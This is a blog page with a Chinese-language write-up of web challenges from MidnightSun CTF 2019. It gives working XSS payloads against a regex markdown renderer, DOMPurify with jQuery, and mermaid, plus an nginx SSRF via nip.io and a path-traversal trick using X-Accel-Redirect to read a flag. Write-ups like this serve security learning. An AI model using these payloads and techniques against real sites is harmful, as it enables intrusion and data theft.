<!DOCTYPE html>
<html>
    <!-- title -->




<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
    <meta name="author" content="damn1t">
    <meta name="renderer" content="webkit">
    <meta name="copyright" content="damn1t">
    <meta name="keywords" content=" | damn1t">
    <meta name="description" content="">
    <meta name="Cache-Control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
    <title>MidnightSun CTF 2019 · Damn World</title>
    <style type="text/css">
    @font-face {
        font-family: 'Oswald-Regular';
        src: url("/font/Oswald-Regular.ttf");
    }

    body {
        margin: 0;
    }

    header,
    footer,
    .back-top,
    .sidebar,
    .container,
    .site-intro-meta,
    .toc-wrapper {
        display: none;
    }

    .site-intro {
        position: relative;
        z-index: 3;
        width: 100%;
        /* height: 50vh; */
        overflow: hidden;
    }

    .site-intro-placeholder {
        position: absolute;
        z-index: -2;
        top: 0;
        left: 0;
        width: calc(100% + 300px);
        height: 100%;
        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
        background-position: center center;
        transform: translate3d(-226px, 0, 0);
        animation: gradient-move 2.5s ease-out 0s 1;
    }

    @keyframes gradient-move {
        0% {
            transform: translate3d(-226px, 0, 0);
        }
        100% {
            transform: translate3d(0, 0, 0);
        }
    }

</style>

    <link rel="preload" href= /css/style.css?v=20180501 as="style" onload="this.onload=null;this.rel='stylesheet'" />
    <link rel="stylesheet" href= /css/mobile.css?v=20180501 media="(max-width: 980px)">
    
    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
        
    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
/* This file is meant as a standalone workflow for
- testing support for link[rel=preload]
- enabling async CSS loading in browsers that do not support rel=preload
- applying rel preload css once loaded, whether supported or not.
*/ -->
<script>
(function( w ){
	"use strict";
	// rel=preload support test
	if( !w.loadCSS ){
		w.loadCSS = function(){};
	}
	// define on the loadCSS obj
	var rp = loadCSS.relpreload = {};
	// rel=preload feature support test
	// runs once and returns a function for compat purposes
	rp.support = (function(){
		var ret;
		try {
			ret = w.document.createElement( "link" ).relList.supports( "preload" );
		} catch (e) {
			ret = false;
		}
		return function(){
			return ret;
		};
	})();

	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
	// then change that media back to its intended value on load
	rp.bindMediaToggle = function( link ){
		// remember existing media attr for ultimate state, or default to 'all'
		var finalMedia = link.media || "all";

		function enableStylesheet(){
			link.media = finalMedia;
		}

		// bind load handlers to enable media
		if( link.addEventListener ){
			link.addEventListener( "load", enableStylesheet );
		} else if( link.attachEvent ){
			link.attachEvent( "onload", enableStylesheet );
		}

		// Set rel and non-applicable media type to start an async request
		// note: timeout allows this to happen async to let rendering continue in IE
		setTimeout(function(){
			link.rel = "stylesheet";
			link.media = "only x";
		});
		// also enable media after 3 seconds,
		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
		setTimeout( enableStylesheet, 3000 );
	};

	// loop through link elements in DOM
	rp.poly = function(){
		// double check this to prevent external calls from running
		if( rp.support() ){
			return;
		}
		var links = w.document.getElementsByTagName( "link" );
		for( var i = 0; i < links.length; i++ ){
			var link = links[ i ];
			// qualify links to those with rel=preload and as=style attrs
			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
				// prevent rerunning on link
				link.setAttribute( "data-loadcss", true );
				// bind listeners to toggle media back
				rp.bindMediaToggle( link );
			}
		}
	};

	// if unsupported, run the polyfill
	if( !rp.support() ){
		// run once at least
		rp.poly();

		// rerun poly on an interval until onload
		var run = w.setInterval( rp.poly, 500 );
		if( w.addEventListener ){
			w.addEventListener( "load", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		} else if( w.attachEvent ){
			w.attachEvent( "onload", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		}
	}


	// commonjs
	if( typeof exports !== "undefined" ){
		exports.loadCSS = loadCSS;
	}
	else {
		w.loadCSS = loadCSS;
	}
}( typeof global !== "undefined" ? global : this ) );
</script>

    <link rel="icon" href= "/assets/Spson.ico" />
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />    
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
    <link rel="preload" href="/scripts/main.js" as="script" />
    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
    <!-- 百度统计  -->
    
    <!-- 谷歌统计  -->
    
</head>

    
        <body class="post-body">
    
    
<header class="header">

    <div class="read-progress"></div>
    <div class="header-sidebar-menu">&#xe775;</div>
    <!-- post页的toggle banner  -->
    
    <div class="banner">
            <div class="blog-title">
                <a href="/" >damn guys</a>
            </div>
            <div class="post-title">
                <a href="#" class="post-name">MidnightSun CTF 2019</a>
            </div>
    </div>
    
    <a class="home-link" href=/>damn guys</a>
</header>
    <div class="wrapper">
        <div class="site-intro" style=








height:50vh;

>
    
    <!-- 主页  -->
    
    
    <!-- 404页  -->
            
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-img" style="background-image: url(/intro/page.jpg)"></div>
    <div class="site-intro-meta">
        <!-- 标题  -->
        <h1 class="intro-title">
            <!-- 主页  -->
            
            MidnightSun CTF 2019
            <!-- 404 -->
            
        </h1>
        <!-- 副标题 -->
        <p class="intro-subtitle">
            <!-- 主页副标题  -->
            
            
            <!-- 404 -->
            
        </p>
        <!-- 文章页meta -->
        
            <!-- 文章页标签  -->
            
                <div class= post-intro-tags >
    
        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF">CTF</a>
    
</div>
            
            <div class="post-intro-meta">
                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
                <span class="post-intro-time">2019/04/08</span>
                
                <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                    <span class="iconfont-archer">&#xe602;</span>
                    <span id="busuanzi_value_page_pv"></span>
                </span>
                
                <span class="shareWrapper">
                    <span class="iconfont-archer shareIcon">&#xe71d;</span>
                    <span class="shareText">Share</span>
                    <ul class="shareList">
                        <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
                            <div class="share-qrcode"></div>
                        </li>
                        <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
                        <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
                        <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
                        <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
                    </ul>
                </span>
            </div>
        
    </div>
</div>
        <script>
  // load webfont-loader async, and add callback function
  function async(u, cb, err) {
    var d = document, t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
    s.parentNode.insertBefore(o, s);
  }
  
  // get user agent
  var browser = {
    versions: function () {
      var u = window.navigator.userAgent;
      return {
        userAgent: u,
        trident: u.indexOf('Trident') > -1, //IE内核
        presto: u.indexOf('Presto') > -1, //opera内核
        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
        iPad: u.indexOf('iPad') > -1, //是否为iPad
        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
      };
    }()
  }
  console.log("userAgent:" + browser.versions.userAgent);

  // callback
  function fontLoaded() {
    console.log('font loaded');
    if (document.getElementsByClassName('site-intro-meta')) {
      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
      var postIntroTags = document.getElementsByClassName('post-intro-tags')[0],
        postIntroMeat = document.getElementsByClassName('post-intro-meta')[0];
      if (postIntroTags) {
        postIntroTags.classList.add('post-fade-in');
      }
      if (postIntroMeat) {
        postIntroMeat.classList.add('post-fade-in');
      }
    }
  }

  // UC不支持跨域，所以直接显示
  function asyncCb(){
    if (browser.versions.uc) {
      console.log("UCBrowser");
      fontLoaded();
    } else {
      WebFont.load({
        custom: {
          families: ['Oswald-Regular']
        },
        loading: function () {  //所有字体开始加载
          // console.log('loading');
        },
        active: function () {  //所有字体已渲染
          fontLoaded();
        },
        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
          console.log('inactive: timeout');
          fontLoaded();
        },
        timeout: 5000 // Set the timeout to two seconds
      });
    }
  }

  function asyncErr(){
    console.warn('script load from CDN failed, will load local script')
  }

  var asyncLoadWithFallBack = function(arr, success, reject) {
      var currReject = function(){
        reject()
        arr.shift()
        if(arr.length)
          async(arr[0], success, currReject)
        }

      async(arr[0], success, currReject)
  }

  asyncLoadWithFallBack([
    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
    "/lib/webfontloader.min.js"
  ], asyncCb, asyncErr)
</script>        
        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
        <div class="container container-unloaded">
            <main class="main post-page">
    <article class="article-entry">
        <h1 id="MidnightSun-CTF-2019"><a href="#MidnightSun-CTF-2019" class="headerlink" title="MidnightSun CTF 2019"></a>MidnightSun CTF 2019</h1><h2 id="MARCODOWNO"><a href="#MARCODOWNO" class="headerlink" title="MARCODOWNO"></a>MARCODOWNO</h2><p>点入主页面的链接，查看源码，注意到regexp的规则</p>
<pre><code>input = decodeURIComponent(location.search.match(/input=([^&amp;#]+)/)[1]);

function markdown(text) {
text = text.
replace(/[&lt;]/g, &apos;&apos;).
replace(/----/g, &apos;&lt;hr&gt;&apos;).
replace(/&gt; ?([^\n]+)/g, &apos;&lt;blockquote&gt;$1&lt;/blockquote&gt;&apos;).
replace(/\*\*([^*]+)\*\*/g, &apos;&lt;b&gt;$1&lt;/b&gt;&apos;).
replace(/__([^_]+)__/g, &apos;&lt;b&gt;$1&lt;/b&gt;&apos;).
replace(/\*([^\s][^*]+)\*/g, &apos;&lt;i&gt;$1&lt;/i&gt;&apos;).
replace(/\* ([^*]+)/g, &apos;&lt;li&gt;$1&lt;/li&gt;&apos;).
replace(/##### ([^#\n]+)/g, &apos;&lt;h5&gt;$1&lt;/h5&gt;&apos;).
replace(/#### ([^#\n]+)/g, &apos;&lt;h4&gt;$1&lt;/h4&gt;&apos;).
replace(/### ([^#\n]+)/g, &apos;&lt;h3&gt;$1&lt;/h3&gt;&apos;).
replace(/## ([^#\n]+)/g, &apos;&lt;h2&gt;$1&lt;/h2&gt;&apos;).
replace(/# ([^#\n]+)/g, &apos;&lt;h1&gt;$1&lt;/h1&gt;&apos;).
replace(/(?&lt;!\()(https?:\/\/[a-zA-Z0-9./?#-]+)/g, &apos;&lt;a href=&quot;$1&quot;&gt;$1&lt;/a&gt;&apos;).
replace(/!\[([^\]]+)\]\((https?:\/\/[a-zA-Z0-9./?#]+)\)/g, &apos;&lt;img src=&quot;$2&quot; alt=&quot;$1&quot;/&gt;&apos;).
replace(/(?&lt;!!)\[([^\]]+)\]\((https?:\/\/[a-zA-Z0-9./?#-]+)\)/g, &apos;&lt;a href=&quot;$2&quot;&gt;$1&lt;/a&gt;&apos;).
replace(/`([^`]+)`/g, &apos;&lt;code&gt;$1&lt;/code&gt;&apos;).replace(/```([^`]+)```/g, &apos;&lt;code&gt;$1&lt;/code&gt;&apos;).
replace(/\n/g, &quot;&lt;br&gt;&quot;);
return text;
}

window.onload = function() {
$(&quot;#markdown&quot;).text(input);
$(&quot;#rendered&quot;).html(markdown(input));
}
</code></pre><p>关于<a href="http://www.w3school.com.cn/jsref/jsref_replace.asp" target="_blank" rel="noopener">replace函数</a>：<br>replace() 方法用于在字符串中用一些字符替换另一些字符，或替换一个与正则表达式匹配的子串<br>语法：stringObject.replace(regexp/substr,replacement)</p>
<blockquote>
<p>可能大家都会对$1这个特殊字符表示什么意思不是很理解，其实$1表示的就是左边表达式中括号内的字符，即第一个子匹配，同理可得$2表示第二个子匹配。。什么是子匹配呢？？通俗点讲，就是左边每一个括号是第一个字匹配，第二个括号是第二个子匹配。</p>
</blockquote>
<p><a href="https://www.cnblogs.com/mmzuo-798/p/7264093.html" target="_blank" rel="noopener">js正则表达式详解</a></p>
<p>题目要求触发xss弹出1，我们可以看到<code>&lt;img&gt;</code>标签,于是以<code>&lt;img src=&quot;(url)&quot; onload=&quot;alert(1)&quot;&gt;</code><br>payload:<code>![hello%22onload=%22alert(%271%27);](https://cristianrichie.github.io/assets/images/me.jpg)</code></p>
<p><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="noopener">xss cheatsheet</a></p>
<h2 id="Cloudb"><a href="#Cloudb" class="headerlink" title="Cloudb"></a>Cloudb</h2><p>//这题复现时有点问题，没有云端验证的post请求</p>
<h2 id="Bigspin"><a href="#Bigspin" class="headerlink" title="Bigspin"></a>Bigspin</h2><p>查看源码：</p>
<pre><code>&lt;html&gt;
What&apos;s it gonna be? Are you an &lt;a href=&quot;/uberadmin/&quot;&gt;uberadmin&lt;/a&gt;, an &lt;a href=&quot;/admin/&quot;&gt;admin&lt;/a&gt;, a &lt;a href=&quot;/user/&quot;&gt;user&lt;/a&gt;, or (most likely) just a &lt;a href=&quot;/pleb/&quot;&gt;pleb&lt;/a&gt;?
&lt;/html&gt;
</code></pre><p><strong>uberadmin：403<br>admin：404<br>user：403<br>pleb：出现了一个example网页</strong><br><img src="https://i.imgur.com/JbojjFN.png" alt=""></p>
<p>进一步尝试<code>/pleb./</code>,显示<strong>502 bad getaway</strong>，搜索nginx出现502的<a href="https://www.keycdn.com/support/502-bad-gateway" target="_blank" rel="noopener">原因</a>，得到如下：</p>
<blockquote>
<p>What Are the Reasons for 502 Bad Gateway Responses?<br>There are 3 main culprits that cause 502 Bad Gateway responses. These include:</p>
<p><strong>Domain name not resolvable</strong>: The domain name is not resolving to the correct IP or it does not resolve to any IP. It is important to note that DNS changes could take same time until they are global fully propagated and active. This is dependant on the TTL, or time to live, defined per record.<br><strong>Origin server down</strong>: The server is not reachable, either because it is down or there is no connectivity to the server given.<br><strong>Firewall blocks request</strong>: A firewall blocks the communication between the edge servers and the origin server. This can also be caused by security plugins of your CMS. Some DDOS protection and mitigation systems might are too overreactive and start blocking requests from our content delivery servers.</p>
</blockquote>
<p>最有可能的原因就是”domain name not resolvable”，<code>/pleb</code>指向了一个<strong><a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a></strong>域名，他是可解析的，但当我们添加了“dd”之后，域名就变为了<strong><a href="http://www.example.comdd" target="_blank" rel="noopener">www.example.comdd</a></strong>,因此无法处理</p>
<p>这里有个点，利用<a href="http://nip.io" target="_blank" rel="noopener">nip.io</a><br>于是有payload：<code>/pleb.127.0.0.1.nip.io/user/</code>,得到回显</p>
<pre><code>&lt;html&gt;
&lt;head&gt;&lt;title&gt;Index of /user/&lt;/title&gt;&lt;/head&gt;
&lt;body bgcolor=&quot;white&quot;&gt;
&lt;h1&gt;Index of /user/&lt;/h1&gt;&lt;hr&gt;&lt;pre&gt;&lt;a href=&quot;../&quot;&gt;../&lt;/a&gt;
&lt;a href=&quot;nginx.c%C3%B6nf%20&quot;&gt;nginx.c枚nf &lt;/a  05-Apr-2019 11:511253
&lt;/pre&gt;&lt;hr&gt;&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>因为nginx对特殊字符的处理不太友好，因此将<code>nginx.c枚nf</code>进行两次urlencode，得到<code>nginx.c%25C3%25B6nf%2520</code>，于是访问</p>
<pre><code>worker_processes 1;
user nobody nobody;
error_log /dev/stdout;
pid /tmp/nginx.pid;
events {
  worker_connections 1024;
}

http {

# Set an array of temp and cache files options that otherwise defaults to
# restricted locations accessible only to root.

client_body_temp_path /tmp/client_body;
fastcgi_temp_path /tmp/fastcgi_temp;
proxy_temp_path /tmp/proxy_temp;
scgi_temp_path /tmp/scgi_temp;
uwsgi_temp_path /tmp/uwsgi_temp;
resolver 8.8.8.8 ipv6=off;

server {
listen 80;

location / {
root /var/www/html/public;
try_files $uri $uri/index.html $uri/ =404;
}

location /user {
allow 127.0.0.1;
deny all;
autoindex on;
root /var/www/html/;
}

location /admin {
internal;
autoindex on;
alias /var/www/html/admin/;
}

location /uberadmin {
allow 0.13.3.7;
deny all;
autoindex on;
alias /var/www/html/uberadmin/;
}

location ~ /pleb([/a-zA-Z0-9.:%]+) {
proxy_pass   http://example.com$1;
}

access_log /dev/stdout;
error_log /dev/stdout;
}

}
</code></pre><p>尝试访问<strong>uberadmin</strong>，又出现了502，这时转而查看<strong>/admin</strong>,允许的地址范围是<strong>internal</strong>,google一番，在官方文档中找到<a href="http://nginx.org/en/docs/http/ngx_http_core_module.html#internal" target="_blank" rel="noopener">解释</a>：</p>
<blockquote>
<p>Specifies that a given location can only be used for internal requests. For external requests, the client error 404 (Not Found) is returned. Internal requests are the following:</p>
<p>requests redirected by the error_page, index, random_index, and try_files directives;<br>requests redirected by the “X-Accel-Redirect” response header field from an upstream server;<br>subrequests formed</p>
</blockquote>
<p>注意到第二条，于是可以利用“X-Accel-Redirect”<br>思路是在自己服务器上，写上如下代码：</p>
<pre><code>&lt;?php
header(&quot;X-Accel-Redirect:/admin/&quot;)
?&gt;
</code></pre><p>然后访问自己的服务器，得到一个flag.txt,但直接更改为“/admin/flag.txt”会访问失败，要求uberadmin才能访问，于是再次更改为“/admin../uberadmin/flag.txt”即可</p>
<p>很鬼，我访问失败了，放个writeup链接：<br><a href="https://medium.com/@defmax/midnight-sun-ctf-2019-quals-writeup-437ea139d90c" target="_blank" rel="noopener">https://medium.com/@defmax/midnight-sun-ctf-2019-quals-writeup-437ea139d90c</a></p>
<ul>
<li>另一种方法（成功）</li>
</ul>
<p>在自己vps上的nginx.conf中添加如下配置：</p>
<pre name="code">
location = /x.html {
        add_header X-Accel-Redirect "/admin/";
        return 200 hm;
}
</pre>

<p>访问/pleb.ip.nip.io/x.html,成功跳转</p>
<p>尝试改为<code>/admin/flag.txt</code>,提示</p>
<blockquote>
<p>hmmm, should admins really get flags? seems like an uberadmin thing to me</p>
</blockquote>
<p>于是再次添加如下配置：</p>
<pre>
location = /y.html {
        add_header X-Accel-Redirect "/admin../uberadmin/flag.txt";
        return 200 hm;
}
</pre>


<p>成功得到flag</p>
<h2 id="marcoolio"><a href="#marcoolio" class="headerlink" title="marcoolio"></a>marcoolio</h2><p>关键代码如下：</p>
<pre><code>&lt;script&gt;
input = decodeURIComponent(location.search.match(/input=([^&amp;#]+)/)[1]);
var converter = new showdown.Converter({tables: true});

window.onload=function(){
  $(&quot;#markdown&quot;).val(input);
  html = converter.makeHtml(input);
  clean = DOMPurify.sanitize(html);
  md = converter.makeMarkdown(clean);
  if(md.replace(/[\s\\]/g,&quot;&quot;) === input.replace(/[\s\\]/g,&quot;&quot;)){
$(&quot;#render&quot;).html(html);
  }else{
  $(&quot;#render&quot;).html(&quot;&lt;font id=&apos;error&apos; color=red&gt;&lt;/font&gt;&quot;);
  $(&quot;#error&quot;).text(&quot;hacking attempt!!!&quot;);
  }
}

function rerender(){
  try{
input = $(&quot;#markdown&quot;).val();
html = converter.makeHtml(input);
clean = DOMPurify.sanitize(html);
md = converter.makeMarkdown(clean);
if(md.replace(/[\s\\]/g,&quot;&quot;) === input.replace(/[\s\\]/g,&quot;&quot;)){
  $(&quot;#render&quot;).html(html);
}else{
  $(&quot;#render&quot;).html(&quot;&lt;font id=&apos;error&apos; color=red&gt;&lt;/font&gt;&quot;);
  $(&quot;#error&quot;).text(&quot;hacking attempt!!!&quot;);
}
  }catch(x){
$(&quot;#render&quot;).html(&quot;&lt;font id=&apos;error&apos; color=red&gt;&lt;/font&gt;&quot;);
$(&quot;#error&quot;).text(x);
  }
}

&lt;/script&gt;
</code></pre><p>注意到使用了<strong>DOMPurify.sanitize</strong>，它可以用来进行xss过滤，查看DOMPurify的<a href="https://github.com/cure53/DOMPurify" target="_blank" rel="noopener">文档</a>，注意到一段文字：</p>
<blockquote>
<p>The resulting HTML can be written into a DOM element using innerHTML or the DOM using document.write(). That is fully up to you. But keep in mind, if you use the sanitized HTML with jQuery’s very insecure elm.html() method, then the SAFE_FOR_JQUERY flag has to be set to make sure it’s safe! Other than that, all is fine.</p>
</blockquote>
<p>使用了jQuery且没有<strong>SAFE_FOR_JQUERY</strong>,下一步就是找payload，然后在<a href="https://github.com/cure53/DOMPurify/blob/2724763e41313b1a54724dfda5573e8b63116962/test/test-suite.js#L53" target="_blank" rel="noopener">测试用例</a>中找到关于<strong>SAFE_FOR_JQUERY</strong>的payload，第三个：<code>&lt;option&gt;&lt;style&gt;&lt;/option&gt;&lt;/select&gt;&lt;b&gt;&lt;img src=xx: onerror=alert(1)&gt;&lt;/style&gt;&lt;/option&gt;</code>可用</p>
<h2 id="Marcozuckerbergo"><a href="#Marcozuckerbergo" class="headerlink" title="Marcozuckerbergo"></a>Marcozuckerbergo</h2><p>关键代码：</p>
<pre><code>&lt;script&gt;
input = decodeURIComponent(location.search.match(/input=([^&amp;#]+)/)[1]);

window.onload=function(){
  $(&quot;#markdown&quot;).text(input);
  $(&quot;#render&quot;).text($(&quot;#markdown&quot;).text());
  mermaid.init(undefined, $(&quot;#render&quot;));
}

function rerender(){
  try{
$(&quot;#render&quot;).html();$(&quot;#render&quot;).removeAttr(&quot;data-processed&quot;);$(&quot;#render&quot;).text($(&quot;#markdown&quot;).text());mermaid.init(undefined, $(&quot;#render&quot;));
  }catch(x){
$(&quot;#render&quot;).html(&quot;&lt;font id=&apos;error&apos; color=red&gt;&lt;/font&gt;&quot;);
$(&quot;#error&quot;).text(x);
  }
}

&lt;/script&gt;
</code></pre><p>注意到<strong>mermaid.init</strong>这个玩意儿，搜索，可知是一个<a href="https://github.com/knsv/mermaid" target="_blank" rel="noopener">绘图工具</a>，于是寻求找到问题，查询issue，看到<a href="https://github.com/knsv/mermaid/issues/548" target="_blank" rel="noopener">一个</a>，提问者想要插入图片，下面给出了一个payload：<code>graph TD; Dir((&lt;img src=&#39;https://iconscout.com/ms-icon-310x310.png&#39; width=&#39;40&#39; /&gt;))</code>，尝试<code>graph TD; Dir((&lt;img src=&#39;address.png&#39; width=&#39;40&#39; onerror=&#39;javascript:alert</code>1<code>&#39;&gt;))</code>，成功！</p>
<ul>
<li>另一种方法<br><a href="https://github.com/knsv/mermaid/issues/213" target="_blank" rel="noopener">issue 213</a>，如果使用如下格式：</li>
</ul>
<pre><code>graph LR
id1[&quot;This is the (text) in the box&quot;]
</code></pre><p>可以插入标签，于是：</p>
<pre><code>graph LR
id1(&quot;&lt;img src=&apos;&apos; onerror=&apos;alert(1)&apos;&gt;&lt;/img&gt;&quot;)
</code></pre><h2 id="Rubenscube"><a href="#Rubenscube" class="headerlink" title="Rubenscube"></a>Rubenscube</h2>
    </article>
    <!-- license  -->
    
        <div class="license-wrapper">
            <p>原文作者: <a href="http://microvorld.com">damn1t</a>
            <p>原文链接: <a href="http://microvorld.com/2019/04/08/CTF/MidnightSun CTF 2019/">http://microvorld.com/2019/04/08/CTF/MidnightSun CTF 2019/</a>
            <p>发表日期: <a href="http://microvorld.com/2019/04/08/CTF/MidnightSun CTF 2019/">四月 8日 2019, 6:04:20</a>
            <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
        </div>
    
    <!-- paginator  -->
    <ul class="post-paginator">
        <li class="next">
            
                <div class="nextSlogan">Next Post</div>
                <a href= "/2019/04/09/图像/watermark/" title=  >
                    <div class="nextTitle">[Untitled Post]</div>
                </a>
            
        </li>
        <li class="previous">
            
                <div class="prevSlogan">Previous Post</div>
                <a href= "/2019/04/03/CTF/VolgaCTF 2019(web)/" title= VolgaCTF 2019 Quals >
                    <div class="prevTitle">VolgaCTF 2019 Quals</div>
                </a>
            
        </li>
    </ul>
    <!-- 评论插件 -->
    <!-- 来必力City版安装代码 -->

<!-- City版安装代码已完成 -->
    
    
    <!--PC版-->

    <!--PC版-->


    
    <!-- 评论 -->
</main>
            <!-- profile -->
            
        </div>
        <footer class="footer footer-unloaded">
    <!-- social  -->
    
    <div class="social">
        
    
        
            
                <a href="mailto:870059622@qq.com" class="iconfont-archer email" title=email ></a>
            
        
    
        
            
                <a href="//github.com/microvorld" class="iconfont-archer github" target="_blank" title=github></a>
            
        
    
        
    
        
    
        
            
                <a href="/flatline" class="iconfont-archer zhihu" target="_blank" title=zhihu></a>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    

    </div>
    
    <!-- powered by Hexo  -->
    <div class="copyright">
        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
    </div>
    <!-- 不蒜子  -->
    
    <div class="busuanzi-container">
        <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span>
        </span>
    </div>
    
</footer>
    </div>
    <!-- toc -->
    
    <div class="toc-wrapper" style=
    







top:50vh;

    >
        <div class="toc-catalog">
            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
        </div>
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MidnightSun-CTF-2019"><span class="toc-number">1.</span> <span class="toc-text">MidnightSun CTF 2019</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MARCODOWNO"><span class="toc-number">1.1.</span> <span class="toc-text">MARCODOWNO</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cloudb"><span class="toc-number">1.2.</span> <span class="toc-text">Cloudb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bigspin"><span class="toc-number">1.3.</span> <span class="toc-text">Bigspin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#marcoolio"><span class="toc-number">1.4.</span> <span class="toc-text">marcoolio</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Marcozuckerbergo"><span class="toc-number">1.5.</span> <span class="toc-text">Marcozuckerbergo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rubenscube"><span class="toc-number">1.6.</span> <span class="toc-text">Rubenscube</span></a></li></ol></li></ol>
    </div>
    
    <div class="back-top iconfont-archer">&#xe639;</div>
    <div class="sidebar sidebar-hide">
    <ul class="sidebar-tabs sidebar-tabs-active-0">
        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
    </ul>
    <div class="sidebar-content sidebar-content-show-archive">
          <div class="sidebar-panel-archives">
    <!-- 在ejs中将archive按照时间排序 -->
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    <div class="total-archive"> Total : 26 </div>
    
    <div class="post-archive">
    
    
    
    
    <div class="archive-year"> 2019 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/11</span><a class="archive-post-title" href= "/2019/04/11/cve/CVE-2018-17057/" >[Untitled Post]</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/10</span><a class="archive-post-title" href= "/2019/04/10/misc/png隐写/" >[Untitled Post]</a>
